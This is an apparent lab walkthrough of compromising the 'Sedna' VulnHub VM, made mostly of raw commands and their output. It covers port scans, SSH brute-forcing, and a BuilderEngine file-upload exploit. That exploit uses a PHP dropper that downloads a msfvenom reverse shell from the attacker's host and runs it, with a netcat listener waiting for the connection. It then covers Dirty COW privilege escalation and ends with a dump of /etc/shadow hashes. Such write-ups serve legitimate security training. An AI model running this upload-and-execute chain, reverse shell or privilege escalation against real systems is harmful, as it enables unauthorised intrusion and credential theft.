Sedna
https://download.vulnhub.com/hackfest2016/Sedna.ova

root@kali:~/Desktop# bash ./detailPortScan.sh 10.0.0.4
working on 10.0.0.4...
will be a while so relax ^^

unicornscan 10.0.0.4:1-65535
TCP: 22,53,80,110,111,139,143,445,993,995,8080,52894

nmap 10.0.0.4 -A -p 22,53,80,110,111,139,143,445,993,995,8080,52894

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-04-07 15:38 EDT
Nmap scan report for 10.0.0.4
Host is up (0.00035s latency).
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 aa:c3:9e:80:b4:81:15:dd:60:d5:08:ba:3f:e0:af:08 (DSA)
|   2048 41:7f:c2:5d:d5:3a:68:e4:c5:d9:cc:60:06:76:93:a5 (RSA)
|_  256 ef:2d:65:85:f8:3a:85:c2:33:0b:7d:f9:c8:92:22:03 (ECDSA)
53/tcp    open  domain      ISC BIND 9.9.5-3-Ubuntu
| dns-nsid: 
|_  bind.version: 9.9.5-3-Ubuntu
80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_Hackers
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
110/tcp   open  pop3        Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE SASL PIPELINING TOP STLS CAPA RESP-CODES UIDL
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T19:17:14
|_Not valid after:  2026-10-07T19:17:14
|_ssl-date: TLS randomness does not represent time
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          47247/udp  status
|_  100024  1          52894/tcp  status
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp   open  imap        Dovecot imapd (Ubuntu)
|_imap-capabilities: more capabilities IDLE post-login have LOGIN-REFERRALS LITERAL+ STARTTLS IMAP4rev1 SASL-IR ENABLE Pre-login OK ID LOGINDISABLEDA0001 listed
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T19:17:14
|_Not valid after:  2026-10-07T19:17:14
|_ssl-date: TLS randomness does not represent time
445/tcp   open  netbios-ssn Samba smbd 4.1.6-Ubuntu (workgroup: WORKGROUP)
993/tcp   open  ssl/imap    Dovecot imapd (Ubuntu)
|_imap-capabilities: capabilities IDLE post-login more LOGIN-REFERRALS LITERAL+ have IMAP4rev1 SASL-IR ENABLE Pre-login OK ID AUTH=PLAINA0001 listed
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T19:17:14
|_Not valid after:  2026-10-07T19:17:14
|_ssl-date: TLS randomness does not represent time
995/tcp   open  ssl/pop3    Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE SASL(PLAIN) USER TOP PIPELINING CAPA RESP-CODES UIDL
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2016-10-07T19:17:14
|_Not valid after:  2026-10-07T19:17:14
|_ssl-date: TLS randomness does not represent time
8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
| http-methods: 
|_  Potentially risky methods: PUT DELETE
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat
52894/tcp open  status      1 (RPC #100024)
MAC Address: 08:00:27:5E:0C:4E (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.4
Network Distance: 1 hop
Service Info: Host: SEDNA; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -0s, deviation: 0s, median: -0s
|_nbstat: NetBIOS name: SEDNA, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Unix (Samba 4.1.6-Ubuntu)
|   NetBIOS computer name: SEDNA
|   Workgroup: WORKGROUP
|_  System time: 2017-04-07T15:39:05-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smbv2-enabled: Server supports SMBv2 protocol

TRACEROUTE
HOP RTT     ADDRESS
1   0.35 ms 10.0.0.4

Post-scan script results:
| clock-skew: 
|_  -0s: Majority of systems scanned
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.45 seconds

unicornscan -mU 10.0.0.4:1-65535
UDP: 53,111,137,5353,53

nmap 10.0.0.4 -sU -A -p 53,111,137,5353,53

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2017-04-07 15:43 EDT
WARNING: Duplicate port number(s) specified.  Are you alert enough to be using Nmap?  Have some coffee or Jolt(tm).
Nmap scan report for 10.0.0.4
Host is up (0.00038s latency).
PORT     STATE SERVICE    VERSION
53/udp   open  domain     ISC BIND 9.9.5-3-Ubuntu
| dns-nsid: 
|_  bind.version: 9.9.5-3-Ubuntu
|_dns-recursion: Recursion appears to be enabled
111/udp  open  rpcbind    2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          47247/udp  status
|_  100024  1          52894/tcp  status
137/udp  open  netbios-ns Samba nmbd netbios-ns (workgroup: WORKGROUP)
5353/udp open  mdns       DNS-based service discovery
| dns-service-discovery: 
|   9/tcp workstation
|_    Address=10.0.0.4 2605:e000:1124:112:a00:27ff:fe5e:c4e
MAC Address: 08:00:27:5E:0C:4E (Oracle VirtualBox virtual NIC)
Too many fingerprints match this host to give specific OS details
Network Distance: 1 hop
Service Info: Host: SEDNA

Host script results:
|_nbstat: NetBIOS name: SEDNA, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

TRACEROUTE
HOP RTT     ADDRESS
1   0.38 ms 10.0.0.4

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.07 seconds

root@kali:~/Desktop# enum4linux  10.0.0.4

[+] Minimum password age: None
	[+] Reset Account Lockout Counter: 30 minutes
	[+] Locked Account Duration: 30 minutes
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: Not Set

user:[viper] rid:[0x3e8]
user:[root] rid:[0x3e9]

root@kali:~/Desktop# hydra -L 4.users 10.0.0.4 ssh -e nsr
Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2017-04-07 15:55:51
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 6 tasks per 1 server, overall 64 tasks, 6 login tries (l:2/p:3), ~0 tries per task
[DATA] attacking service ssh on port 22
1 of 1 target completed, 0 valid passwords found
Hydra (http://www.thc.org/thc-hydra) finished at 2017-04-07 15:55:54

root@kali:~/Desktop# nikto -h http://10.0.0.4
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.0.4
+ Target Hostname:    10.0.0.4
+ Target Port:        80
+ Start Time:         2017-04-07 16:01:31 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x65 0x53fb059bb5bc8 
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ "robots.txt" contains 1 entry which should be manually viewed.
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3268: /files/: Directory indexing found.
+ OSVDB-3092: /files/: This might be interesting...
+ OSVDB-3092: /system/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ OSVDB-3092: /license.txt: License file found may identify site software.
+ 7518 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2017-04-07 16:01:49 (GMT-4) (18 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
root@kali:~/Desktop# curl http://10.0.0.4/robots.txt
User-Agent: *
Disallow: Hackers

Browse to 
http://10.0.0.4/files/captcha/
Directory access is forbidden.

http://10.0.0.4/files/users/
Directory access is forbidden.

http://10.0.0.4/system/
Directory access is forbidden.

http://10.0.0.4/license.txt
Copyright (c) 2012 - 2015 BuilderEngine / Radian Enterprise Systems Limited

root@kali:~/Desktop# dirb http://10.0.0.4 /usr/share/seclists/Discovery/Web_Content/big.txt 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Apr  7 16:06:52 2017
URL_BASE: http://10.0.0.4/
WORDLIST_FILES: /usr/share/seclists/Discovery/Web_Content/big.txt

-----------------

GENERATED WORDS: 20458                                                         

---- Scanning URL: http://10.0.0.4/ ----
==> DIRECTORY: http://10.0.0.4/blocks/                                                                                                             
==> DIRECTORY: http://10.0.0.4/files/                                                                                                              
==> DIRECTORY: http://10.0.0.4/modules/                                                                                                            
+ http://10.0.0.4/robots.txt (CODE:200|SIZE:36)                                                                                                    
+ http://10.0.0.4/server-status (CODE:403|SIZE:288)                                                                                                
==> DIRECTORY: http://10.0.0.4/system/                                                                                                             
==> DIRECTORY: http://10.0.0.4/themes/                                                                                                             
                                                                                                                                                   
---- Entering directory: http://10.0.0.4/blocks/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                   
---- Entering directory: http://10.0.0.4/files/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                   
---- Entering directory: http://10.0.0.4/modules/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                   
---- Entering directory: http://10.0.0.4/system/ ----
==> DIRECTORY: http://10.0.0.4/system/core/                                                                                                        
==> DIRECTORY: http://10.0.0.4/system/database/                                                                                                    
==> DIRECTORY: http://10.0.0.4/system/fonts/                                                                                                       
==> DIRECTORY: http://10.0.0.4/system/helpers/                                                                                                     
==> DIRECTORY: http://10.0.0.4/system/language/                                                                                                    
==> DIRECTORY: http://10.0.0.4/system/libraries/                                                                                                   
                                                                                                                                                   
---- Entering directory: http://10.0.0.4/themes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                                                   
---- Entering directory: http://10.0.0.4/system/core/ ----
==> DIRECTORY: http://10.0.0.4/system/core/compat/                                                                                                 
                                                                                                                                                   
---- Entering directory: http://10.0.0.4/system/database/ ----
==> DIRECTORY: http://10.0.0.4/system/database/drivers/                                                                                            
                                                                                                                                                   
---- Entering directory: http://10.0.0.4/system/fonts/ ----
                                                                                                                                                   
---- Entering directory: http://10.0.0.4/system/helpers/ ----
                                                                                                                                                   
---- Entering directory: http://10.0.0.4/system/language/ ----
==> DIRECTORY: http://10.0.0.4/system/language/english/                                                                                            
                                                                                                                                                   
---- Entering directory: http://10.0.0.4/system/libraries/ ----
                                                                                                                                                   
---- Entering directory: http://10.0.0.4/system/core/compat/ ----
                                                                                                                                                   
---- Entering directory: http://10.0.0.4/system/database/drivers/ ----
==> DIRECTORY: http://10.0.0.4/system/database/drivers/mssql/                                                                                      
==> DIRECTORY: http://10.0.0.4/system/database/drivers/mysql/                                                                                      
==> DIRECTORY: http://10.0.0.4/system/database/drivers/odbc/                                                                                       
                                                                                                                                                   
---- Entering directory: http://10.0.0.4/system/language/english/ ----
                                                                                                                                                   
---- Entering directory: http://10.0.0.4/system/database/drivers/mssql/ ----
                                                                                                                                                   
---- Entering directory: http://10.0.0.4/system/database/drivers/mysql/ ----
                                                                                                                                                   
---- Entering directory: http://10.0.0.4/system/database/drivers/odbc/ ----
                                                                                                                                                   
-----------------
END_TIME: Fri Apr  7 16:10:13 2017
DOWNLOADED: 286412 - FOUND: 2

google site:www.exploit-db.com BuilderEngine found file upload vulnerability
https://www.exploit-db.com/exploits/40390/

create post.html
html>
<body>
<form method="post" action="http://10.0.0.4/themes/dashboard/assets/plugins/jquery-file-upload/server/php/" enctype="multipart/form-data">
    <input type="file" name="files[]" />
    <input type="submit" value="send" />
</form>
</body>
</html>

create download-exec-rev-443.php
<?php echo shell_exec("echo $PATH"); ?>
<?php echo shell_exec("which wget"); ?>
<?php echo shell_exec("which chmod"); ?>
<?php echo shell_exec("/usr/bin/wget http://10.0.0.14/rev-443 -O /tmp/rev-443"); ?>
<?php echo shell_exec("/bin/chmod +x /tmp/rev-443"); ?>
<?php echo shell_exec("/tmp/rev-443 &"); ?>

create a reverse shell rev-443
root@kali:~/Desktop# msfvenom -p linux/x86/shell_reverse_tcp LPORT=443 LHOST=10.0.0.14 -f elf > /var/www/html/rev-443

from browser, browse to post.html, and upload download-exec-rev-443.php
start netcat and browse to http://10.0.0.4/files/download-exec-rev-443.php to trigger it

root@kali:~/Desktop# nc -lnvp 443
listening on [any] 443 ...
connect to [10.0.0.14] from (UNKNOWN) [10.0.0.4] 60355
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
which python
/usr/bin/python
python -c 'import pty;pty.spawn("/bin/bash")'

www-data@Sedna:/tmp$ cat /etc/passwd | grep -vP '(false)|(nologin)'
cat /etc/passwd | grep -vP '(false)|(nologin)'
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
libuuid:x:100:101::/var/lib/libuuid:
postgres:x:111:121:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
crackmeforpoints:x:1000:1000::/home/crackmeforpoints:

www-data@Sedna:/tmp$ uname -a
uname -a
Linux Sedna 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014 i686 i686 i686 GNU/Linux
www-data@Sedna:/tmp$ cat /etc/*-release
cat /etc/*-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=14.04
DISTRIB_CODENAME=trusty
DISTRIB_DESCRIPTION="Ubuntu 14.04.1 LTS"
NAME="Ubuntu"
VERSION="14.04.1 LTS, Trusty Tahr"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 14.04.1 LTS"
VERSION_ID="14.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"

check file wit hsetuid bit
www-data@Sedna:/var/www$ find / -perm -4000 -ls 2>/dev/null
find / -perm -4000 -ls 2>/dev/null
131133   88 -rwsr-xr-x   1 root     root        88752 Jun  3  2014 /bin/mount
131146   40 -rwsr-xr-x   1 root     root        38932 May  7  2014 /bin/ping
131174   68 -rwsr-xr-x   1 root     root        67704 Jun  3  2014 /bin/umount
147037   32 -rwsr-xr-x   1 root     root        30112 Dec 16  2013 /bin/fusermount
131147   44 -rwsr-xr-x   1 root     root        43316 May  7  2014 /bin/ping6
 21755   48 -rwsr-sr-x   1 daemon   daemon      46652 Oct 21  2013 /usr/bin/at
 22577   16 -rwsr-xr-x   1 root     lpadmin     13672 Jul 18  2014 /usr/bin/lppasswd
 20867   20 -rwsr-xr-x   1 root     root        18136 May  7  2014 /usr/bin/traceroute6.iputils
   417   32 -rwsr-xr-x   1 root     root        30984 Feb 16  2014 /usr/bin/newgrp
 20897   72 -rwsr-xr-x   1 root     root        72860 Oct 21  2013 /usr/bin/mtr
   535  156 -rwsr-xr-x   1 root     root       156708 Feb 10  2014 /usr/bin/sudo
   348   68 -rwsr-xr-x   1 root     root        66252 Feb 16  2014 /usr/bin/gpasswd
   277   36 -rwsr-xr-x   1 root     root        35916 Feb 16  2014 /usr/bin/chsh
 25122   84 -rwsr-sr-x   1 root     mail        83872 Oct 21  2013 /usr/bin/procmail
   274   44 -rwsr-xr-x   1 root     root        44620 Feb 16  2014 /usr/bin/chfn
 22441   20 -rwsr-xr-x   1 root     root        18168 Feb 11  2014 /usr/bin/pkexec
   429   48 -rwsr-xr-x   1 root     root        45420 Feb 16  2014 /usr/bin/passwd
 20934  484 -rwsr-xr-x   1 root     root       492972 May 12  2014 /usr/lib/openssh/ssh-keysign
 22446   12 -rwsr-xr-x   1 root     root         9804 Feb 11  2014 /usr/lib/policykit-1/polkit-agent-helper-1
   624    8 -rwsr-xr-x   1 root     root         5480 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device
  1588   12 -rwsr-xr-x   1 root     root         9612 Apr 12  2014 /usr/lib/pt_chown
 25608   12 -rwsr-xr-x   1 root     root         9752 Jun 11  2012 /usr/lib/authbind/helper
146763  324 -rwsr-xr--   1 root     messagebus   329856 Jul  3  2014 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
 20956  316 -rwsr-xr--   1 root     dip        322968 Jan 22  2013 /usr/sbin/pppd
 21187   20 -rwsr-sr-x   1 libuuid  libuuid     17996 Jun  3  2014 /usr/sbin/uuidd
 22434   36 -rwsr-xr-x   1 root     root        34568 Jun 27  2013 /sbin/mount.cifs
 29051   88 -rwsr-xr-x   1 root     root        88412 Nov  6  2015 /sbin/mount.nfs

possible priv esc
Linux chfn (SuSE 9.3 / 10) - Privilege Escalation	| ./linux/local/1299.sh

www-data@Sedna:/usr/share/tomcat7$ cat defaults.md5sum
cat defaults.md5sum
8db3c173dfe0df41b6515d946324d415 lucid
www-data@Sedna:/usr/share/tomcat7$ cat logrotate.md5sum
cat logrotate.md5sum
9e56464a7cc25288a994171d0e303ba6  logrotate.template


www-data@Sedna:/tmp$ ps aux | grep root
ps aux | grep root
root         1  0.0  0.4   4448  2500 ?        Ss   15:33   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S    15:33   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        S    15:33   0:00 [ksoftirqd/0]
root         4  0.0  0.0      0     0 ?        S    15:33   0:00 [kworker/0:0]
root         5  0.0  0.0      0     0 ?        S<   15:33   0:00 [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        S    15:33   0:00 [kworker/u2:0]
root         7  0.0  0.0      0     0 ?        S    15:33   0:01 [rcu_sched]
root         8  0.0  0.0      0     0 ?        S    15:33   0:00 [rcu_bh]
root         9  0.0  0.0      0     0 ?        S    15:33   0:00 [migration/0]
root        10  0.0  0.0      0     0 ?        S    15:33   0:00 [watchdog/0]
root        11  0.0  0.0      0     0 ?        S<   15:33   0:00 [khelper]
root        12  0.0  0.0      0     0 ?        S    15:33   0:00 [kdevtmpfs]
root        13  0.0  0.0      0     0 ?        S<   15:33   0:00 [netns]
root        14  0.0  0.0      0     0 ?        S<   15:33   0:00 [writeback]
root        15  0.0  0.0      0     0 ?        S<   15:33   0:00 [kintegrityd]
root        16  0.0  0.0      0     0 ?        S<   15:33   0:00 [bioset]
root        17  0.0  0.0      0     0 ?        S<   15:33   0:00 [kworker/u3:0]
root        18  0.0  0.0      0     0 ?        S<   15:33   0:00 [kblockd]
root        19  0.0  0.0      0     0 ?        S<   15:33   0:00 [ata_sff]
root        20  0.0  0.0      0     0 ?        S    15:33   0:00 [khubd]
root        21  0.0  0.0      0     0 ?        S<   15:33   0:00 [md]
root        22  0.0  0.0      0     0 ?        S<   15:33   0:00 [devfreq_wq]
root        23  0.0  0.0      0     0 ?        S    15:33   0:00 [kworker/0:1]
root        25  0.0  0.0      0     0 ?        S    15:33   0:00 [khungtaskd]
root        26  0.0  0.0      0     0 ?        S    15:33   0:00 [kswapd0]
root        27  0.0  0.0      0     0 ?        SN   15:33   0:00 [ksmd]
root        28  0.0  0.0      0     0 ?        S    15:33   0:00 [fsnotify_mark]
root        29  0.0  0.0      0     0 ?        S    15:33   0:00 [ecryptfs-kthrea]
root        30  0.0  0.0      0     0 ?        S<   15:33   0:00 [crypto]
root        42  0.0  0.0      0     0 ?        S<   15:33   0:00 [kthrotld]
root        64  0.0  0.0      0     0 ?        S<   15:33   0:00 [deferwq]
root        65  0.0  0.0      0     0 ?        S<   15:33   0:00 [charger_manager]
root       110  0.0  0.0      0     0 ?        S<   15:33   0:00 [kpsmoused]
root       112  0.0  0.0      0     0 ?        S<   15:33   0:00 [mpt_poll_0]
root       113  0.0  0.0      0     0 ?        S<   15:33   0:00 [mpt/0]
root       114  0.0  0.0      0     0 ?        S    15:33   0:00 [scsi_eh_0]
root       115  0.0  0.0      0     0 ?        S    15:33   0:00 [kworker/u2:3]
root       124  0.0  0.0      0     0 ?        S    15:33   0:00 [jbd2/sda1-8]
root       125  0.0  0.0      0     0 ?        S<   15:33   0:00 [ext4-rsv-conver]
root       395  0.0  0.1   3012   612 ?        S    15:33   0:00 upstart-udev-bridge --daemon
root       409  0.0  0.3  12264  1564 ?        Ss   15:33   0:00 /lib/systemd/systemd-udevd --daemon
root       416  0.0  0.0      0     0 ?        S<   15:33   0:00 [rpciod]
root       439  0.0  0.0      0     0 ?        S<   15:33   0:00 [nfsiod]
root       490  0.0  0.2   3980  1440 ?        Ss   15:33   0:00 /lib/systemd/systemd-logind
root       491  0.0  0.0   3024   416 ?        Ss   15:33   0:00 rpc.idmapd
root       515  0.0  0.5   7860  2788 ?        Ss   15:33   0:00 /usr/sbin/cupsd -f
avahi      518  0.0  0.0   3472   432 ?        S    15:33   0:00 avahi-daemon: chroot helper
root       567  0.0  0.4   8452  2524 ?        Ss   15:33   0:00 /usr/sbin/cups-browsed
root       587  0.0  0.1   3020   856 ?        S    15:33   0:00 upstart-file-bridge --daemon
root       654  0.0  1.2  28812  6472 ?        Ss   15:33   0:00 smbd -F
root       674  0.0  0.5  28812  2976 ?        S    15:33   0:00 smbd -F
root       766  0.0  0.2   2860  1068 ?        Ss   15:33   0:00 rpcbind
root       868  0.0  0.1   3004   888 ?        S    15:33   0:00 upstart-socket-bridge --daemon
root       915  0.0  0.4   5512  2280 ?        Ss   15:33   0:00 dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases eth0
root      1007  0.0  0.9  22208  4696 ?        Ss   15:33   0:00 /usr/sbin/winbindd -F
root      1015  0.0  0.8  22340  4132 ?        S    15:33   0:00 /usr/sbin/winbindd -F
root      1019  0.0  0.4  17384  2480 ?        Ss   15:33   0:00 nmbd -D
root      1113  0.0  0.1   4168   820 tty4     Ss+  15:33   0:00 /sbin/getty -8 38400 tty4
root      1116  0.0  0.1   4168   832 tty5     Ss+  15:33   0:00 /sbin/getty -8 38400 tty5
root      1122  0.0  0.1   4168   824 tty2     Ss+  15:33   0:00 /sbin/getty -8 38400 tty2
root      1123  0.0  0.1   4168   828 tty3     Ss+  15:33   0:00 /sbin/getty -8 38400 tty3
root      1127  0.0  0.1   4168   832 tty6     Ss+  15:33   0:00 /sbin/getty -8 38400 tty6
root      1162  0.0  0.4   7792  2504 ?        Ss   15:33   0:00 /usr/sbin/sshd -D
root      1167  0.0  0.2   3476  1476 ?        Ss   15:33   0:00 /usr/sbin/dovecot -F -c /etc/dovecot/dovecot.conf
root      1173  0.0  0.1   2196   620 ?        Ss   15:33   0:00 acpid -c /etc/acpi/events -s /var/run/acpid.socket
root      1175  0.0  0.1   3052   916 ?        Ss   15:33   0:00 cron
root      1275  0.0  0.2   3180  1052 ?        S    15:33   0:00 dovecot/log
root      1279  0.0  1.9 128260  9808 ?        Sl   15:33   0:00 /usr/sbin/libvirtd -d
root      1590  0.0  0.2   4784  1456 ?        Ss   15:33   0:00 /usr/lib/postfix/master
root      1666  0.0  2.5 102060 13024 ?        Ss   15:33   0:00 /usr/sbin/apache2 -k start
root      1757  0.0  0.1   4168   820 tty1     Ss+  15:34   0:00 /sbin/getty -8 38400 tty1
root      1770  0.0  0.0      0     0 ?        S    15:35   0:00 [kauditd]
root      5782  0.0  0.4  22616  2496 ?        S    15:52   0:00 /usr/sbin/winbindd -F
www-data  8530  0.0  0.1   2604   576 pts/1    S+   18:48   0:00 grep root

www-data@Sedna:/tmp$ netstat -antp
netstat -antp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 10.0.0.4:53             0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:53            0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:953           0.0.0.0:*               LISTEN      -     	-- bind remote deamon control         
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:52894           0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:993             0.0.0.0:*               LISTEN      - 		--> imaps              
tcp        0      0 0.0.0.0:995             0.0.0.0:*               LISTEN      -          --> pop3s     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:110             0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:143             0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -               
tcp        0      0 10.0.0.4:60358          10.0.0.14:443           ESTABLISHED 6533/sh         
tcp        0      0 10.0.0.4:60355          10.0.0.14:443           CLOSE_WAIT  28043/sh

tried the following but no luck
find / -perm -2 -type f -ls 2>/dev/null | grep -v proc
find / -perm -2 ! -type l -ls 2>/dev/null | grep -v proc
cd /var/www/html
find ./builderengine -perm -4 -type f -ls 2>/dev/null | grep -iP '(conf)|(setting)|(user)|(pass)'
find ./files -perm -4 -type f -ls 2>/dev/null | grep -iP '(conf)|(setting)|(user)|(pass)'
find ./modules -perm -4 -type f -ls 2>/dev/null | grep -iP '(conf)|(setting)|(user)|(pass)'
find ./system -perm -4 -type f -ls 2>/dev/null | grep -iP '(conf)|(setting)|(user)|(pass)'
find ./themes -perm -4 -type f -ls 2>/dev/null | grep -iP '(conf)|(setting)|(user)|(pass)'
find . -type f -ls | grep -vP '(.php$)|(.html$)|(.png$)|(.js$)|(.css$)|(.svg$)|(.gif$)|(.jpg$)|(.yaml$)'
find /etc -perm -4 -type f -ls 2>/dev/null | grep -iP '(conf)|(setting)|(user)|(pass)'


priv esc with dirty and dirtyCow works but for 

dirty 
1) have to ctrl+c as soon as mmap: b7765000 pops up
2) imediately ssh firefart@10.0.1.3
3)imediately run echo 0 > /proc/sys/vm/dirty_writeback_centisecs
to prevent system crash

for dirtyCow
imediately run echo 0 > /proc/sys/vm/dirty_writeback_centisecs when a shell pops up

firefart@Sedna:~# cat /etc/shadow
root:$6$sZyJlUny$OcHP9bd8dO9rAKAlryxUjnUbH0dxgZc2uCePZMUUKSeIdALUulXLQ1iDjoEQpvZI.HTHOHUkCR.m39Xrt3mm91:17097:0:99999:7:::
daemon:*:16273:0:99999:7:::
bin:*:16273:0:99999:7:::
sys:*:16273:0:99999:7:::
sync:*:16273:0:99999:7:::
games:*:16273:0:99999:7:::
man:*:16273:0:99999:7:::
lp:*:16273:0:99999:7:::
mail:*:16273:0:99999:7:::
news:*:16273:0:99999:7:::
uucp:*:16273:0:99999:7:::
proxy:*:16273:0:99999:7:::
www-data:*:16273:0:99999:7:::
backup:*:16273:0:99999:7:::
list:*:16273:0:99999:7:::
irc:*:16273:0:99999:7:::
gnats:*:16273:0:99999:7:::
nobody:*:16273:0:99999:7:::
libuuid:!:16273:0:99999:7:::
syslog:*:16273:0:99999:7:::
mysql:!:17081:0:99999:7:::
messagebus:*:17081:0:99999:7:::
bind:*:17081:0:99999:7:::
postfix:*:17081:0:99999:7:::
dnsmasq:*:17081:0:99999:7:::
dovecot:*:17081:0:99999:7:::
dovenull:*:17081:0:99999:7:::
landscape:*:17081:0:99999:7:::
sshd:*:17081:0:99999:7:::
postgres:*:17081:0:99999:7:::
avahi:*:17081:0:99999:7:::
colord:*:17081:0:99999:7:::
libvirt-qemu:!:17081:0:99999:7:::
libvirt-dnsmasq:!:17081:0:99999:7:::
tomcat7:*:17081:0:99999:7:::
crackmeforpoints:$6$p22wX4fD$RRAamkeGIA56pj4MpM7CbrKPhShVkZnNH2NjZ8JMUP6Y/1upG.54kSph/HSP1LFcn4.2C11cF0R7QmojBqNy5/:17104:0:99999:7:::
statd:*:17110:0:99999:7:::

